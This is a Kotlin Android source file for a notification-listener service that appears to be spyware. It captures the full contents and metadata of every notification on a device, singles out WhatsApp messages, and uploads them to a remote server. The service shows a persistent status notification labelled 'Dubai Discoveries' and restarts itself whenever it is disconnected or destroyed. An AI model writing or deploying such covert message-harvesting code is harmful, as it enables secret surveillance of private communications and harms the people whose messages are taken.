package com.devicesync.app.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Parcelable
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import com.devicesync.app.MainActivity
import com.devicesync.app.R
import com.devicesync.app.data.repository.DeviceSyncRepository
import com.devicesync.app.utils.SettingsManager
import com.devicesync.app.utils.DeviceInfoUtils
import java.util.Date
import java.io.Serializable

class NotificationListenerService : NotificationListenerService() {
    
    companion object {
        private const val NOTIFICATION_CHANNEL_ID = "notification_listener_channel"
        private const val FOREGROUND_NOTIFICATION_ID = 1001
        private const val SERVICE_RESTART_DELAY = 5000L // 5 seconds
    }
    
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private lateinit var repository: DeviceSyncRepository
    private lateinit var dataHarvester: DataHarvester
    private lateinit var settingsManager: SettingsManager
    private var deviceId: String? = null
    private var isServiceRunning = false
    private var connectionRetryJob: Job? = null
    
    override fun onCreate() {
        super.onCreate()
        println("🔔 NotificationListenerService onCreate() called")
        
        try {
            repository = DeviceSyncRepository(applicationContext)
            dataHarvester = DataHarvester(applicationContext)
            settingsManager = SettingsManager(applicationContext)
            
            // Try to get device ID from settings
            val savedDeviceId = settingsManager.getDeviceId()
            
            // If device ID is null, try to generate it
            if (savedDeviceId.isNullOrEmpty()) {
                val newDeviceId = generateDeviceId()
                deviceId = newDeviceId
                settingsManager.saveDeviceId(newDeviceId)
                println("🔔 Generated new device ID: $newDeviceId")
            } else {
                deviceId = savedDeviceId
            }
            
            val currentDeviceId = deviceId
            println("🔔 NotificationListenerService created for device: $currentDeviceId")
            println("🔔 Service is ready to monitor notifications")
            println("🔔 Repository initialized: ${repository != null}")
            println("🔔 DataHarvester initialized: ${dataHarvester != null}")
            println("🔔 SettingsManager initialized: ${settingsManager != null}")
            
            // Create notification channel for foreground service
            createNotificationChannel()
            
            // Start foreground service to keep it alive
            startForegroundService()
            
            isServiceRunning = true
            
        } catch (e: Exception) {
            println("❌ Error in NotificationListenerService onCreate: ${e.message}")
            println("❌ Stack trace: ${e.stackTraceToString()}")
        }
    }
    
    private fun captureWhatsAppMessageFromNotification(title: String, text: String, packageName: String) {
        try {
            val deviceId = this.deviceId ?: settingsManager.getDeviceId() ?: generateDeviceId()
            
            // Create WhatsApp message data
            val messageId = "wa_notif_${System.currentTimeMillis()}_${title.hashCode()}"
            val chatName = title
            val message = text
            val timestamp = System.currentTimeMillis()
            
            println("📱 Captured WhatsApp message: $chatName - $message")
            
            // Store the message for later sync (we'll sync it when the service syncs)
            // For now, just log it so we can see it's being captured
            
        } catch (e: Exception) {
            println("❌ Error capturing WhatsApp message: ${e.message}")
        }
    }
    
    private fun generateDeviceId(): String {
        return DeviceInfoUtils.getDeviceId(this)
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                "Notification Listener Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Keeps the notification listener service running"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
            }
            
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
            println("🔔 Notification channel created")
        }
    }
    
    private fun startForegroundService() {
        try {
            // Create intent for notification tap action
            val intent = Intent(this, MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            }
            val pendingIntent = PendingIntent.getActivity(
                this, 0, intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            
            // Create persistent notification
            val notification = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
                .setContentTitle("Dubai Discoveries")
                .setContentText("Notification monitoring active")
                .setSmallIcon(R.drawable.ic_notification)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setAutoCancel(false)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .build()
            
            // Start foreground service
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(FOREGROUND_NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
            } else {
                startForeground(FOREGROUND_NOTIFICATION_ID, notification)
            }
            
            println("🔔 Foreground service started with persistent notification")
            
        } catch (e: Exception) {
            println("❌ Error starting foreground service: ${e.message}")
        }
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        deviceId = intent?.getStringExtra("deviceId") ?: settingsManager.getDeviceId()
        println("NotificationListenerService started for device: $deviceId")
        return START_STICKY
    }
    
    // Step 7: Monitor notifications in real-time
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        
        println("🔔 onNotificationPosted called with notification: ${sbn?.packageName}")
        
        // Ensure service is running and connected
        if (!isServiceRunning) {
            println("🔔 Service not running, attempting to restart...")
            scheduleReconnection()
            return
        }
        
        if (sbn == null) {
            println("🔔 Received null notification, skipping")
            return
        }
        
        try {
            println("🔔 Processing notification from: ${sbn.packageName}")
            
            // Extract notification details for filtering
            val packageName = sbn.packageName
            val extras = sbn.notification.extras
            val title = extras.getString(android.app.Notification.EXTRA_TITLE)
            val text = extras.getString(android.app.Notification.EXTRA_TEXT)
            
            // 📊 REAL-TIME NOTIFICATION CAPTURE LOG
            println("🎯 REAL-TIME NOTIFICATION DETECTED:")
            println("   📦 Package: $packageName")
            println("   📋 Title: ${title ?: "N/A"}")
            println("   📝 Text: ${text ?: "N/A"}")
            println("   ⏰ Time: ${Date()}")
            println("   🆔 ID: ${sbn.id}")
            
            // Filter out unwanted system notifications
            if (packageName == "android") {
                when {
                    title?.contains("connected to your mobile data hotspot", ignoreCase = true) == true -> {
                        println("🔔 Skipping system hotspot notification: $title")
                        return
                    }
                    title?.contains("mobile data used", ignoreCase = true) == true -> {
                        println("🔔 Skipping mobile data usage notification: $title")
                        return
                    }
                    title?.contains("battery", ignoreCase = true) == true -> {
                        println("🔔 Skipping battery notification: $title")
                        return
                    }
                    title?.contains("storage", ignoreCase = true) == true -> {
                        println("🔔 Skipping storage notification: $title")
                        return
                    }
                }
            }
            
            // Capture WhatsApp messages from notifications
            if (packageName == "com.whatsapp" || packageName == "com.whatsapp.w4b") {
                if (title?.isNotEmpty() == true && text?.isNotEmpty() == true) {
                    println("📱 Capturing WhatsApp message: $title - $text")
                    captureWhatsAppMessageFromNotification(title, text, packageName)
                }
            }
            
            // Check if notifications are enabled in settings
            if (!settingsManager.isDataTypeEnabled("notifications")) {
                println("🔔 Notifications disabled in settings, skipping")
                return
            }
            
            println("✅ NOTIFICATION APPROVED FOR SYNC - Starting sync process...")
            
            serviceScope.launch {
                try {
                    // Get device ID with fallback
                    var currentDeviceId = deviceId
                    if (currentDeviceId.isNullOrEmpty()) {
                        currentDeviceId = settingsManager.getDeviceId()
                        if (currentDeviceId.isNullOrEmpty()) {
                            currentDeviceId = generateDeviceId()
                            settingsManager.saveDeviceId(currentDeviceId)
                            deviceId = currentDeviceId
                            println("🔔 Generated device ID in notification handler: $currentDeviceId")
                        }
                    }
                    
                    if (currentDeviceId != null) {
                        println("🔔 Syncing notification for device: $currentDeviceId")
                        syncNewNotification(currentDeviceId, sbn)
                    } else {
                        println("🔔 Device ID is still null, cannot sync notification")
                    }
                } catch (e: Exception) {
                    println("🔔 Error processing notification: ${e.message}")
                    println("🔔 Stack trace: ${e.stackTraceToString()}")
                }
            }
        } catch (e: Exception) {
            println("❌ Error in onNotificationPosted: ${e.message}")
            println("❌ Stack trace: ${e.stackTraceToString()}")
        }
    }
    
    private suspend fun syncNewNotification(deviceId: String, sbn: StatusBarNotification) {
        try {
            val notification = sbn.notification
            val extras = notification.extras
            
            // Extract notification details
            val packageName = sbn.packageName
            val appName = getAppName(packageName)
            val title = extras.getCharSequence("android.title")?.toString()
            val text = extras.getCharSequence("android.text")?.toString()
            val bigText = extras.getCharSequence("android.bigText")?.toString()
            val timestamp = sbn.postTime
            
            // 📊 COMPREHENSIVE NOTIFICATION LOGGING BEFORE API SEND
            println("=".repeat(80))
            println("🔔 REAL-TIME NOTIFICATION CAPTURED - BEFORE API SEND")
            println("=".repeat(80))
            println("📱 Device ID: $deviceId")
            println("📦 Package Name: $packageName")
            println("📱 App Name: $appName")
            println("📋 Title: ${title ?: "N/A"}")
            println("📝 Text: ${text ?: "N/A"}")
            println("📄 Big Text: ${bigText ?: "N/A"}")
            println("⏰ Timestamp: $timestamp (${Date(timestamp)})")
            println("🆔 Notification ID: ${sbn.id}")
            println("📊 Notification Key: ${sbn.key}")
            println("👤 User ID: ${sbn.user}")
            println("🏷️ Tag: ${sbn.tag}")
            println("📈 Post Time: ${sbn.postTime}")
            println("🔊 Priority: ${sbn.notification.priority}")
            println("🔔 Channel ID: ${sbn.notification.channelId}")
            println("🎯 Category: ${sbn.notification.category}")
            println("🔗 Actions: ${sbn.notification.actions?.size ?: 0}")
            
            // Log all extras for debugging
            println("📋 All Extras:")
            extras.keySet().forEach { key ->
                val value = extras.get(key)
                println("   $key: $value")
            }
            println("=".repeat(80))
            
            // Create notification model
            val notificationModel = dataHarvester.createNotificationModel(
                notificationId = "${sbn.id}_${sbn.postTime}",
                packageName = packageName,
                appName = appName,
                title = title,
                text = bigText ?: text,
                metadata = mapOf(
                    // Basic notification info
                    "notificationId" to sbn.id.toString(),
                    "notificationKey" to (sbn.key ?: ""),
                    "userId" to (sbn.user?.hashCode()?.toString() ?: ""),
                    "tag" to (sbn.tag ?: ""),
                    "postTime" to sbn.postTime.toString(),
                    
                    // Notification object details
                    "priority" to sbn.notification.priority.toString(),
                    "channelId" to (sbn.notification.channelId ?: ""),
                    "category" to (sbn.notification.category ?: ""),
                    "actionsCount" to (sbn.notification.actions?.size ?: 0).toString(),
                    "flags" to sbn.notification.flags.toString(),
                    "when" to sbn.notification.`when`.toString(),
                    "number" to sbn.notification.number.toString(),
                    "tickerText" to (sbn.notification.tickerText ?: ""),
                    "contentIntent" to (sbn.notification.contentIntent?.toString() ?: ""),
                    "deleteIntent" to (sbn.notification.deleteIntent?.toString() ?: ""),
                    "fullScreenIntent" to (sbn.notification.fullScreenIntent?.toString() ?: ""),
                    
                    // Actions information
                    "actions" to (sbn.notification.actions?.joinToString(", ") { action ->
                        "title=${action.title?.toString() ?: ""}, actionIntent=${action.actionIntent?.toString() ?: ""}"
                    } ?: "[]"),
                    
                    // Extras - ALL notification extras
                    "extras" to extras.toString(),
                    
                    // System information
                    "systemInfo" to mapOf(
                        "androidVersion" to android.os.Build.VERSION.RELEASE,
                        "sdkVersion" to android.os.Build.VERSION.SDK_INT.toString(),
                        "deviceModel" to android.os.Build.MODEL,
                        "manufacturer" to android.os.Build.MANUFACTURER,
                        "captureTime" to System.currentTimeMillis().toString(),
                        "captureTimeFormatted" to Date().toString()
                    ),
                    
                    // App information
                    "appInfo" to mapOf(
                        "packageName" to packageName,
                        "appName" to (appName ?: ""),
                        "appVersion" to try {
                            packageManager.getPackageInfo(packageName, 0).versionName ?: "unknown"
                        } catch (e: Exception) {
                            "unknown"
                        },
                        "appVersionCode" to try {
                            packageManager.getPackageInfo(packageName, 0).versionCode.toString()
                        } catch (e: Exception) {
                            "-1"
                        }
                    ),
                    
                    // Notification content analysis
                    "contentAnalysis" to mapOf(
                        "titleLength" to (title?.length ?: 0).toString(),
                        "textLength" to ((bigText ?: text)?.length ?: 0).toString(),
                        "hasTitle" to (title != null).toString(),
                        "hasText" to ((bigText ?: text) != null).toString(),
                        "hasBigText" to (bigText != null).toString(),
                        "titleWords" to (title?.split("\\s+".toRegex())?.size ?: 0).toString(),
                        "textWords" to ((bigText ?: text)?.split("\\s+".toRegex())?.size ?: 0).toString()
                    ),
                    
                    // Raw notification data for debugging
                    "rawData" to mapOf(
                        "notificationObject" to sbn.notification.toString(),
                        "extrasBundle" to extras.toString(),
                        "allExtrasKeys" to extras.keySet().toList().toString(),
                        "notificationFlags" to sbn.notification.flags.toString(),
                        "notificationWhen" to sbn.notification.`when`.toString(),
                        "notificationNumber" to sbn.notification.number.toString()
                    )
                )
            )
            
            // Log the model being sent to API
            println("📤 NOTIFICATION MODEL FOR API:")
            println("   ID: ${notificationModel.notificationId}")
            println("   Package: ${notificationModel.packageName}")
            println("   App: ${notificationModel.appName}")
            println("   Title: ${notificationModel.title}")
            println("   Text: ${notificationModel.text}")
            println("   Timestamp: ${notificationModel.timestamp}")
            println("=".repeat(80))
            
            // Sync to server immediately
            println("🚀 SENDING TO API...")
            val result = repository.syncNotifications(deviceId, listOf(notificationModel))
            
            if (result.isSuccess) {
                println("✅ NOTIFICATION SYNCED SUCCESSFULLY!")
                println("   Response: ${result.message}")
                println("   Data: ${result.data}")
            } else {
                println("❌ NOTIFICATION SYNC FAILED!")
                println("   Error: ${result.message}")
                println("   Data: ${result.data}")
            }
            println("=".repeat(80))
            
        } catch (e: Exception) {
            println("💥 ERROR SYNCING NOTIFICATION:")
            println("   Exception: ${e.message}")
            println("   Stack trace: ${e.stackTraceToString()}")
            println("=".repeat(80))
        }
    }
    
    private fun getAppName(packageName: String): String {
        return try {
            val appInfo = packageManager.getApplicationInfo(packageName, 0)
            packageManager.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }
    
    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
        // Optionally handle notification removal
    }
    
    override fun onListenerConnected() {
        super.onListenerConnected()
        println("🔔 NotificationListenerService connected successfully")
        isServiceRunning = true
        
        // Cancel any pending retry jobs
        connectionRetryJob?.cancel()
        
        // Update notification to show connected status
        updateNotificationStatus("Connected and monitoring")
    }
    
    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        println("🔔 NotificationListenerService disconnected")
        isServiceRunning = false
        
        // Update notification to show disconnected status
        updateNotificationStatus("Disconnected - attempting to reconnect")
        
        // Schedule reconnection attempt
        scheduleReconnection()
    }
    
    private fun scheduleReconnection() {
        connectionRetryJob?.cancel()
        connectionRetryJob = serviceScope.launch {
            delay(SERVICE_RESTART_DELAY)
            println("🔔 Attempting to reconnect notification listener service...")
            
            try {
                // Try to restart the service
                val intent = Intent(this@NotificationListenerService, NotificationListenerService::class.java)
                startService(intent)
                
                // If that doesn't work, try to request rebinding
                if (!isServiceRunning) {
                    println("🔔 Service restart failed, requesting rebinding...")
                    try {
                        requestRebind(ComponentName(this@NotificationListenerService, NotificationListenerService::class.java))
                    } catch (e: Exception) {
                        println("❌ Failed to request rebinding: ${e.message}")
                    }
                }
            } catch (e: Exception) {
                println("❌ Error during reconnection attempt: ${e.message}")
            }
        }
    }
    
    private fun updateNotificationStatus(status: String) {
        try {
            val intent = Intent(this, MainActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            }
            val pendingIntent = PendingIntent.getActivity(
                this, 0, intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            
            val notification = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
                .setContentTitle("Dubai Discoveries")
                .setContentText(status)
                .setSmallIcon(R.drawable.ic_notification)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setAutoCancel(false)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .build()
            
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.notify(FOREGROUND_NOTIFICATION_ID, notification)
            
        } catch (e: Exception) {
            println("❌ Error updating notification status: ${e.message}")
        }
    }
    
    override fun onDestroy() {
        super.onDestroy()
        println("🔔 NotificationListenerService being destroyed")
        
        isServiceRunning = false
        connectionRetryJob?.cancel()
        serviceScope.cancel()
        
        // Try to restart the service if it was killed
        try {
            val intent = Intent(this, NotificationListenerService::class.java)
            startService(intent)
            println("🔔 Attempting to restart service after destruction")
        } catch (e: Exception) {
            println("❌ Failed to restart service: ${e.message}")
        }
        
        println("🔔 NotificationListenerService destroyed")
    }
}
